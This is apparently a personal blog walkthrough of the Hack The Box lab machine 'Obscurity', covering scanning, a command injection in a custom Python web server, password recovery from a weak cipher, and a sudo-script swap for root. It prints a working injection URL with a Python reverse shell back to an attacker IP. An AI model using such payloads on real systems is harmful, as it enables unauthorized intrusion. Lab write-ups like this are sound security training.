---
layout: post
author: k0z4c
title: Obscurity
---

## **Getting Access**

We start with

```bash
nmap -Pn -n -O -sC -vv -oA nmap/tcp_default obscurity
```

![]({% link assets/htb/obscurity/nmap.png %})

Looking at port 8080 and reading the home page we can see that there's a file somewhere on the webserver  called SuperSecureServer.py 

![]({% link assets/htb/obscurity/hint.png %})

We can try to fuzz the URL http://obscurity:8080 to search for that file; so we fire up dirbuster and we set URL fuzzing 
with this value /{dir}/SuperSecureServer.py using the wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt .

![]({% link assets/htb/obscurity/dirb.png %})

Let's download the file!

![]({% link assets/htb/obscurity/download.png %})

Diving into the source code we can see that handleRequest is the method of the class Server that perform the business logic 

![]({% link assets/htb/obscurity/handle.png %})

So looking at it, we can spot a command injection point in the called function serveDoc

![]({% link assets/htb/obscurity/injection.png %})

So we can inject commands simply doing an HTTP request that closes the quotes with:

```bash
'; <payload>;'
```

So we inject a reverse shell coded in python as the payload. 
Then, doing this HTTP request that will spawn a reverse shell on 443

```python
http://obscurity:8080/';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.44",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

So, after firing up a netcat linstener on 443 to handle the connection back,  we do:
(the URL is encoded with URL encoding) 

![]({% link assets/htb/obscurity/inj_exploit.png %})

... and voila!

![]({% link assets/htb/obscurity/user.png %})

## **Privilege escalation to user**

Poking around we find robert's folder 

![]({% link assets/htb/obscurity/robert.png %})

Let's see.. passwordreminider.txt is encrypted. So, analyzing SuperSecureCrypt.py nothing interesting is found.. 
So trying with the things we have, we end up that the user ciphered the key for passwrodreminder.txt (out.txt) with check.txt. 

Manipulating now a quick decrypter that reads the key from a file

```python
# file decrypt.py 

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

if __name__ == '__main__':

        with open('check.txt', 'r', encoding='UTF-8') as f:
                key = f.read()

        with open('out.txt', 'r', encoding='UTF-8') as f:
                text = f.read()
        decrypted = decrypt(text, key)
        print(decrypted)
```

Then we recover the key for passwrodreminder.txt

![]({% link assets/htb/obscurity/mid.png %})

We save the result in a file called key.txt. Then changing in our script the key file with key.txt and out.txt with the passwordreminder.txt and we get the password:

![]({% link assets/htb/obscurity/key.png %})

.. OKay, what next? 
There was an SSH port opened.. let's try!

So, Connecting now through SSH with the new key we log as robert user

![]({% link assets/htb/obscurity/login.png %})

Now we can read the user's flag

![]({% link assets/htb/obscurity/user_flag.png %})

user pwnd!

let's move forward

## Privilege escalation for root

Looking at the BetterSSH.py script we see that it uses sudo; so it is enabled on the system and user robert is in the sudoers file too.
Then let's check robert's sudo privileges

![]({% link assets/htb/obscurity/sudo.png %})

So roberts can execute BetterSSH.py with root privileges without requiring a password neither.

The first thing that came on to my mind was to backdoor the file but we can not modify the script (owned by root). 
So after a while, we can spot that yes, we can not modify the file but we can modify the folder

![]({% link assets/htb/obscurity/spot.png %})

so.. we can implant a new  script with the name BetterSSH.py that spawns a root shell. 
Very very bad, mr. Robert!

Writing then a quick script to obtain a shell through python (recycle, man) and saving it as BetterSSH.py in a new BetterSSH folder:
(remember to mv the original one like mv BetterSSH smth)

```python
# BetterSSH.py
while True:
    command = input('> ')
    cmd.extend(command.split(" "))
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    o,e = proc.communicate()
    print('Output: ' + o.decode('ascii'))
    print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

let's execute now the script with sudo 

![]({% link assets/htb/obscurity/root.png %})

... pwned (:
